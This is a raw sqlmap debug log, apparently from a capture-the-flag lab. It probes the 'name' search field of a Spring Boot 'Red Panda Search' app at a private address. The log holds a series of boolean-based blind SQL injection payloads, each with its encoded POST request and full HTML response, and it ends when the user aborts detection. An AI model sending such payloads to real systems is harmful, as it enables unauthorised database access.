+name=woodenk%20WHERE%201405%3D1405%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20OQIx
+
+[12:50:47] [TRAFFIC IN] HTTP response [#109] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:46 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk WHERE 1405=1405 AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- OQIx</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:47] [PAYLOAD] woodenk) AS mAYw WHERE 6401=6401 AND 9119=(SELECT (CASE WHEN (9119=8614) THEN 9119 ELSE (SELECT 8614 UNION SELECT 4629) END))-- AxkI
+[12:50:47] [TRAFFIC OUT] HTTP request [#110]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 199
+Connection: close
+
+name=woodenk%29%20AS%20mAYw%20WHERE%206401%3D6401%20AND%209119%3D%28SELECT%20%28CASE%20WHEN%20%289119%3D8614%29%20THEN%209119%20ELSE%20%28SELECT%208614%20UNION%20SELECT%204629%29%20END%29%29--%20AxkI
+
+[12:50:48] [TRAFFIC IN] HTTP response [#110] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:47 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk) AS mAYw WHERE 6401=6401 AND 9119=(SELECT (CASE WHEN (9119=8614) THEN 9119 ELSE (SELECT 8614 UNION SELECT 4629) END))-- AxkI</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:48] [PAYLOAD] woodenk) AS LdUq WHERE 2616=2616 AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- EWMT
+[12:50:48] [TRAFFIC OUT] HTTP request [#111]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 199
+Connection: close
+
+name=woodenk%29%20AS%20LdUq%20WHERE%202616%3D2616%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20EWMT
+
+[12:50:48] [TRAFFIC IN] HTTP response [#111] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:47 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk) AS LdUq WHERE 2616=2616 AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- EWMT</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:48] [PAYLOAD] woodenk` WHERE 2511=2511 AND 9724=(SELECT (CASE WHEN (9724=3997) THEN 9724 ELSE (SELECT 3997 UNION SELECT 5206) END))-- uOed
+[12:50:48] [TRAFFIC OUT] HTTP request [#112]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 187
+Connection: close
+
+name=woodenk%60%20WHERE%202511%3D2511%20AND%209724%3D%28SELECT%20%28CASE%20WHEN%20%289724%3D3997%29%20THEN%209724%20ELSE%20%28SELECT%203997%20UNION%20SELECT%205206%29%20END%29%29--%20uOed
+
+[12:50:48] [TRAFFIC IN] HTTP response [#112] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:47 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk` WHERE 2511=2511 AND 9724=(SELECT (CASE WHEN (9724=3997) THEN 9724 ELSE (SELECT 3997 UNION SELECT 5206) END))-- uOed</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:48] [PAYLOAD] woodenk` WHERE 6769=6769 AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- LUfT
+[12:50:48] [TRAFFIC OUT] HTTP request [#113]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 187
+Connection: close
+
+name=woodenk%60%20WHERE%206769%3D6769%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20LUfT
+
+[12:50:48] [TRAFFIC IN] HTTP response [#113] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:47 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk` WHERE 6769=6769 AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- LUfT</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:48] [PAYLOAD] woodenk`=`woodenk` AND 9687=(SELECT (CASE WHEN (9687=4033) THEN 9687 ELSE (SELECT 4033 UNION SELECT 1735) END))-- WaPd
+[12:50:48] [TRAFFIC OUT] HTTP request [#114]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 181
+Connection: close
+
+name=woodenk%60%3D%60woodenk%60%20AND%209687%3D%28SELECT%20%28CASE%20WHEN%20%289687%3D4033%29%20THEN%209687%20ELSE%20%28SELECT%204033%20UNION%20SELECT%201735%29%20END%29%29--%20WaPd
+
+[12:50:48] [TRAFFIC IN] HTTP response [#114] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:47 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk`=`woodenk` AND 9687=(SELECT (CASE WHEN (9687=4033) THEN 9687 ELSE (SELECT 4033 UNION SELECT 1735) END))-- WaPd</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:48] [PAYLOAD] woodenk`=`woodenk` AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- QGVA
+[12:50:48] [TRAFFIC OUT] HTTP request [#115]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 181
+Connection: close
+
+name=woodenk%60%3D%60woodenk%60%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20QGVA
+
+[12:50:49] [TRAFFIC IN] HTTP response [#115] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:47 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk`=`woodenk` AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- QGVA</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:49] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the risk (3) is higher than the provided (1)
+[12:50:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[12:50:49] [PAYLOAD] woodenk')) AND 6871=9404-- vCfg
+[12:50:49] [TRAFFIC OUT] HTTP request [#116]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 50
+Connection: close
+
+name=woodenk%27%29%29%20AND%206871%3D9404--%20vCfg
+
+[12:50:49] [TRAFFIC IN] HTTP response [#116] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:48 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk')) AND 6871=9404-- vCfg</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:49] [PAYLOAD] woodenk')) AND 6131=6131-- jcfb
+[12:50:49] [TRAFFIC OUT] HTTP request [#117]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 50
+Connection: close
+
+name=woodenk%27%29%29%20AND%206131%3D6131--%20jcfb
+
+[12:50:49] [WARNING] user aborted during detection phase
+how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(c)hange verbosity/(q)uit] 
+[12:50:50] [ERROR] user quit
+
+[*] ending @ 12:50:50 /2022-07-16/
+
